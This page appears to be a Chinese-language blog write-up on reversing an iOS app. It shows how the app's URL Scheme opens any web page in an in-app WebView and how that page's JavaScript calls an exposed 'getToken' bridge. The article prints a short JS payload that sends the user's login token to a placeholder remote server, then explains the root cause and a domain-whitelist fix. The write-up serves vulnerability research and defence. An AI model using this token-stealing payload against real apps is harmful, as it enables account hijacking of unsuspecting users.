@@ -1,0 +1,881 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="漏洞," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="前言本篇文章主要分享我是如何一步步，通过 URL Scheme 远程攻击并且窃取用户的登录 token。 什么是 URL Scheme？ URL，我们都很清楚，http://www.apple.com 就是个 URL，我们也叫它链接或网址； Schemes，表示的是一个 URL 中的一个位置——最初始的位置，即 ://之前的那段字符。比如 http://www.apple.com 这个网址的 Sc">
+<meta name="keywords" content="漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用 URL Scheme 远程窃取用户 token">
+<meta property="og:url" content="http://yoursite.com/2020/08/06/利用 URL Scheme 远程窃取用户 token/index.html">
+<meta property="og:site_name" content="dwj1210">
+<meta property="og:description" content="前言本篇文章主要分享我是如何一步步，通过 URL Scheme 远程攻击并且窃取用户的登录 token。 什么是 URL Scheme？ URL，我们都很清楚，http://www.apple.com 就是个 URL，我们也叫它链接或网址； Schemes，表示的是一个 URL 中的一个位置——最初始的位置，即 ://之前的那段字符。比如 http://www.apple.com 这个网址的 Sc">
+<meta property="og:image" content="http://yoursite.com/images/scheme_1.png">
+<meta property="og:image" content="http://yoursite.com/images/scheme_2.png">
+<meta property="og:image" content="http://yoursite.com/images/scheme_3.png">
+<meta property="og:image" content="http://yoursite.com/images/scheme_4.png">
+<meta property="og:image" content="http://yoursite.com/images/scheme_5.png">
+<meta property="og:image" content="http://yoursite.com/images/scheme_6.png">
+<meta property="og:image" content="http://yoursite.com/images/scheme_7.png">
+<meta property="og:image" content="http://yoursite.com/images/scheme_8.png">
+<meta property="og:image" content="http://yoursite.com/images/scheme_9.png">
+<meta property="og:image" content="http://yoursite.com/images/scheme_10.png">
+<meta property="og:image" content="http://yoursite.com/images/scheme_11.png">
+<meta property="og:image" content="http://yoursite.com/images/scheme_12.png">
+<meta property="og:image" content="http://yoursite.com/images/scheme_13.png">
+<meta property="og:image" content="http://yoursite.com/images/scheme_14.png">
+<meta property="og:image" content="http://yoursite.com/images/scheme_15.png">
+<meta property="og:image" content="http://yoursite.com/images/scheme_16.png">
+<meta property="og:updated_time" content="2020-08-06T03:55:08.095Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="利用 URL Scheme 远程窃取用户 token">
+<meta name="twitter:description" content="前言本篇文章主要分享我是如何一步步，通过 URL Scheme 远程攻击并且窃取用户的登录 token。 什么是 URL Scheme？ URL，我们都很清楚，http://www.apple.com 就是个 URL，我们也叫它链接或网址； Schemes，表示的是一个 URL 中的一个位置——最初始的位置，即 ://之前的那段字符。比如 http://www.apple.com 这个网址的 Sc">
+<meta name="twitter:image" content="http://yoursite.com/images/scheme_1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"hide","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/08/06/利用 URL Scheme 远程窃取用户 token/"/>
+
+
+
+
+
+  <title>利用 URL Scheme 远程窃取用户 token | dwj1210</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">dwj1210</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/06/利用 URL Scheme 远程窃取用户 token/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="代伟佳WeChat:337223400">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="dwj1210">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">利用 URL Scheme 远程窃取用户 token</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-08-06T11:36:07+08:00">
+                2020-08-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/08/06/利用 URL Scheme 远程窃取用户 token/" class="leancloud_visitors" data-flag-title="利用 URL Scheme 远程窃取用户 token">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本篇文章主要分享我是如何一步步，通过 URL Scheme 远程攻击并且窃取用户的登录 token。</p>
+<h3 id="什么是-URL-Scheme？"><a href="#什么是-URL-Scheme？" class="headerlink" title="什么是 URL Scheme？"></a>什么是 URL Scheme？</h3><ul>
+<li>URL，我们都很清楚，<code>http://www.apple.com</code> 就是个 URL，我们也叫它链接或网址；</li>
+<li>Schemes，表示的是一个 URL 中的一个位置——最初始的位置，即 <code>://</code>之前的那段字符。比如 <code>http://www.apple.com</code> 这个网址的 <code>Schemes</code> 是 <code>http</code>；</li>
+<li>URL Scheme，<code>tel://10010</code> 则是一个最简单的 URL Scheme，通过这个 URL Scheme 可以在 iOS 设备任何应用中调起电话 App，并且拨打指定号码。</li>
+</ul>
+<p>应用可以通过自定义的 URL Scheme 协议可以实现进程间通信，其具体表现为应用 A 可以通过 URL Scheme 调起应用 B，并且传入携带的参数。</p>
+<h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><p>首先查看应用已注册的 URL Scheme，可以在应用安装包 /info.plist 文件中查找。</p>
+<p><img src="/images/scheme_1.png" alt="image-20200806112917112"></p>
+<p>基础知识 - URL Scheme 回调函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// NS_DEPRECATED_IOS(2_0, 9_0, &quot;Please use application:openURL:options:&quot;) __TVOS_PROHIBITED</span><br><span class="line">- (BOOL)application:(UIApplication *)application handleOpenURL:(NSURL *)url;</span><br><span class="line"></span><br><span class="line">// NS_DEPRECATED_IOS(4_2, 9_0, &quot;Please use application:openURL:options:&quot;) __TVOS_PROHIBITED</span><br><span class="line">- (BOOL)application:(UIApplication *)application openURL:(NSURL *)url sourceApplication:(nullable NSString *)sourceApplication annotation:(id)annotation;</span><br><span class="line"></span><br><span class="line">// NS_AVAILABLE_IOS(9_0)</span><br><span class="line">- (BOOL)application:(UIApplication *)app openURL:(NSURL *)url options:(NSDictionary&lt;UIApplicationOpenURLOptionsKey, id&gt; *)options;</span><br></pre></td></tr></table></figure>
+<p>应用二进制拖进 IDA ，接下来开始一步一步逆向分析代码</p>
+<p>第一个当然是寻找 <code>[AppDelegate application:openURL:options:]</code> 方法：</p>
+<p><img src="/images/scheme_2.png" alt="image-20200805171732252"></p>
+<p>跟进 <code>+[AppSetupConf application:openURL:options:]</code> 方法：</p>
+<p><img src="/images/scheme_3.png" alt="image-20200805171840324"></p>
+<p>这个方法里面既调用了 <code>-[AppsFlyerTracker handleOpenUrl:options:]</code>，还调用了 <code>+[OKBLaunchHandler handleOpenURL:options:]</code> ，这个时候谷歌一下就可以确认，<code>AppsFlyerTracker</code> 是第三方统计、数据追踪的框架。</p>
+<p>所以我们跟进 <code>+[OKBLaunchHandler handleOpenURL:options:]</code> 方法中：</p>
+<p><img src="/images/scheme_4.png" alt="image-20200805172234476"></p>
+<p>点击 <code>+[OKBLaunchHandler eventWithURL:type:]</code> 方法可以看到大概逻辑应该是做事件统计追踪的方法，所以我们继续跟进 <code>+[OKBLaunchHandler dispatchWithURL:coldLaunch:type:]</code> ，关键逻辑：</p>
+<p><img src="/images/scheme_5.png" alt="image-20200805172706383"></p>
+<p>接下来我们仔细分析下这段代码</p>
+<p>首先变量 a3 是方法中第一个参数，通过方法名判断 a3 应该是我们传入的 URL Scheme，接着从代码 57 - 73 行，这部分是在判断传入 URL Scheme 的 scheme 是不是 http 或者 https，不满足条件时，继续执行；当满足条件时，直接 goto LABEL_15； 也就是直接结束该方法。</p>
+<p>代码 74 - 78 行，判断了传入的 URL Scheme 是否存在 host，不存在则直接结束方法。</p>
+<p>分析到这里，我们的 URL Scheme 大概应该是这样的：demo_scheme://xxx</p>
+<p>接着代码 81  行调用了 <code>+[OKBLaunchHandler classWithHost:]</code> 方法，参数为我们传入 URL Scheme 的 host 字符串，并且还有一个返回值，跟进方法进行分析：</p>
+<p><img src="/images/scheme_6.png" alt="image-20200805173936024"></p>
+<p>这个方法看着一顿操作猛如虎，其实就是判断传入字符串是否包含 <code>_</code>，然后删除这个 <code>_</code>，最后赋值到变量 v21 把 <code>OKBLaunchEventHandler_</code> 和 v21 字符串拼接，然后判断这个类是否存在，如果存在，则返回这个类。</p>
+<p>我们在 IDA Function View 里面搜索 <code>`OKBLaunchEventHandler_</code>，发现只可能拼接 <code>Web</code> 或者 <code>MerchanthomeCom</code>：</p>
+<p><img src="/images/scheme_7.png" alt="image-20200805174910302"></p>
+<p>我们看到 <code>OKBLaunchEventHandler_Web</code> 有一个 <code>-[OKBLaunchEventHandler_Web openWebViewWithURL:]</code> 的方法，看起来可以打开传入的网页 URL。所以分析到这里，我们的 URL Scheme 暂时应该是这样的：<code>demo_scheme://web_?</code>。</p>
+<p>继续分析 <code>+[OKBLaunchHandler dispatchWithURL:coldLaunch:type:]</code> 的 85 - 107 行代码：</p>
+<p><img src="/images/scheme_8.png" alt="image-20200805180208399"></p>
+<p>接着调用了  <code>+[OKBJSHandle analysisParamWithQuery:]</code> 方法，并将 URL Scheme 的参数当作此方法参数传入。其实该方法逻辑就是将 URL Scheme 的参数变成一个字典并且返回。紧接着调用  <code>-[OKBLaunchHandlerModel setParams:]</code> 将字典赋值到 <code>OKBLaunchHandlerModel</code> 的 <code>params</code> 属性中 。</p>
+<p>接着 99 - 104 行代码是判断 <code>OKBLaunchEventHandler_Web</code> 是否实现了 <code>-[OKBLaunchEventHandler_Web handleLaunchEventWithModel:]</code> 方法，因为这个方法我们刚在 IDA Function View 中看到了，所以直接调用 <code>-[OKBLaunchEventHandler_Web handleLaunchEventWithModel:]</code>，此时参数是 <code>OKBLaunchHandlerModel</code> 对象，我们要记得这个对象是有一个 params 属性的，且刚被赋值。</p>
+<p>此时我们暂且不管这个字典的内容应该是什么，暂且不管 URL Scheme 的参数部分如何构造，先继续分析代码。</p>
+<p>跟进 <code>-[OKBLaunchEventHandler_Web handleLaunchEventWithModel:]</code> 方法：</p>
+<p><img src="/images/scheme_9.png" alt="image-20200805181052242"></p>
+<p>该方法逻辑比较简单，大概是判断传入 <code>OKBLaunchHandlerModel</code> 对象的 <code>params</code> 字典是否包括 <code>url</code> 键，如果包括的话，<code>url</code>  键对应的值是否以<code>http</code> 或者 <code>https</code> 开头，如果条件均满足，则调用 <code>-[OKBLaunchEventHandler_Web openWebViewWithURL:]</code>。</p>
+<p>在 <code>-[OKBLaunchEventHandler_Web openWebViewWithURL:]</code> 中逻辑简单，直接打开了一个新的控制器，并且加载传入的 url。</p>
+<p><img src="/images/scheme_10.png" alt="image-20200805182221356"></p>
+<p>所以此时我们希望构造的 URL Scheme 格式为：<code>demo_scheme://web_?url=xxx</code>。</p>
+<p>至此我们搞清楚了应用如何校验传入的 URL Scheme，并且我们应该如何构造 URL Scheme 可以打开自定义网页。</p>
+<p>做到这一步我们先验证下之前的猜想，看看效果：</p>
+<p>在 Safari 浏览器输入 <code>demo_scheme://web_?url=https://www.baidu.com</code>，Safari 调起应用并且打开了指定的 <code>https://www.baidu.com</code>：</p>
+<p><img src="/images/scheme_11.png" alt="IMG_0804"></p>
+<p>别急，现在我们只完成了漏洞利用分析的第一步。</p>
+<p>接着我们来看下是否可以通过 js 调用应用的敏感接口。查看 <code>-[OKBWebViewController didReceiveScriptMessage:]</code> 方法，该方法是当 Native 收到 js 调用时的处理函数：</p>
+<p><img src="/images/scheme_12.png" alt="image-20200805185951906"></p>
+<p>此方法的参数是一个 <code>WKScriptMessage</code> 对象，该对象有一个 body 属性，body 就是 js 调用 Native 传入的参数。</p>
+<p>通过分析伪代码可以看到进行了判断 body 的值是否是 <code>getToken</code> ，如果是的话，就调用 <code>-[OKBWebViewController p_callHandler:doSomeThing:completionHandler:]</code> 方法。</p>
+<p>该方法三个参数，第一个是一个 js 传入的参数，也就是 <code>WKScriptMessage</code> 的 body 属性；第二个参数是一个代码块；第三个参数为空。</p>
+<p>查看 <code>-[OKBWebViewController p_callHandler:doSomeThing:completionHandler:]</code> 函数实现：</p>
+<p><img src="/images/scheme_13.png" alt="image-20200805190504803"></p>
+<p>方法第二个参数（传入的代码块）被赋值到 v9，并且调用了这个代码块，返回值保存在了 v11。接着调用 <code>[[OKBWebViewController wkWebView] evaluateJavaScript:completionHandler:]</code>来执行 <code>iOS._callBack(xxx)</code> js 代码。此时我们需要确定 v11，也就是代码块的返回值到底是什么。代码块：</p>
+<p><img src="/images/scheme_14.png" alt="image-20200805190939207"></p>
+<p>这里可以看到是获取了用户的登录 token，并且返回；所以执行的 js 伪代码应该是 <code>iOS._callBack(用户token)</code>。</p>
+<p>到这里我们搞清楚了如何通过 URL Scheme 调起自定义页面，知道了使用 js 调用 Native 如何传递参数，也知道了 Native 如何返回结果到 js 代码，所以我们就可以构造 js 代码来窃取用户的 token，并且发送到远程服务器。</p>
+<p>js 代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    var action = &quot;getToken&quot;;</span><br><span class="line">    window.webkit.messageHandlers.JShandle.postMessage(action);</span><br><span class="line">    var iOS = &#123;</span><br><span class="line">        _callBack:function ( action, param)&#123;</span><br><span class="line">            var httpRequest = new XMLHttpRequest();</span><br><span class="line">            httpRequest.open(&apos;GET&apos;, &apos;https://xxx/&apos; + param, true);</span><br><span class="line">            httpRequest.send();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>这样我们通过 URL Scheme 来调起网页就可以远程获取到用户的 token 了:</p>
+<p><img src="/images/scheme_15.png" alt="img"></p>
+<p>但是这样还不够优雅，我们需要一个网页来调起应用，而不是手动在 Safari 中输入 URL Scheme，这样才可以达到远程攻击的效果。</p>
+<p><img src="/images/scheme_16.png" alt="image-20200806113037250"></p>
+<p>这样在用户浏览网页时，便可以自动通过 URL Scheme 调起应用，并且远程窃取用户的 token 发送到服务器。</p>
+<h3 id="漏洞思路"><a href="#漏洞思路" class="headerlink" title="漏洞思路"></a>漏洞思路</h3><p>我们来缕一下这次利用的思路：</p>
+<p>首先需要应用注册 URL Scheme</p>
+<p>通过 URL Scheme 可以调起攻击者的恶意网页</p>
+<p>Natvive 暴露敏感接口供 js 调用</p>
+<p>js 窃取用户敏感数据，发送到远程服务器</p>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>应用注册 URL Scheme 供外部调用，并且可以在应用内加载指定网页。</p>
+<p>当应用加载攻击者指定网页后，应用未做严格鉴权，导致网页 js 代码调用了应用暴露的敏感 Native 函数。</p>
+<h3 id="如何修复"><a href="#如何修复" class="headerlink" title="如何修复"></a>如何修复</h3><p>当应用有通过 URL Scheme 调起并打开任意网页功能的需求时，需要对打开网页域名做严格过滤，当非白名单域名时，禁止 js 调用 Native 函数。</p>
+<h3 id="说在最后"><a href="#说在最后" class="headerlink" title="说在最后"></a>说在最后</h3><p>本篇文章部分敏感信息已脱敏，仅供学习交流使用。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/漏洞/" rel="tag"><i class="fa fa-tag"></i> 漏洞</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/12/C++ 虚函数表原理及对象内存结构分析/" rel="next" title="C++ 虚函数表原理及对象内存结构分析">
+                <i class="fa fa-chevron-left"></i> C++ 虚函数表原理及对象内存结构分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="代伟佳WeChat:337223400" />
+          <p class="site-author-name" itemprop="name">代伟佳WeChat:337223400</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">13</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是-URL-Scheme？"><span class="nav-number">2.</span> <span class="nav-text">什么是 URL Scheme？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分析过程"><span class="nav-number">3.</span> <span class="nav-text">分析过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞思路"><span class="nav-number">4.</span> <span class="nav-text">漏洞思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞成因"><span class="nav-number">5.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#如何修复"><span class="nav-number">6.</span> <span class="nav-text">如何修复</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#说在最后"><span class="nav-number">7.</span> <span class="nav-text">说在最后</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">代伟佳WeChat:337223400</span>
+</div>
+
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("Tv0ap1PiX5he09oRLIDxPDFq-gzGzoHsz", "oNp2foyUytnAWmG6y9Pun0TY");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
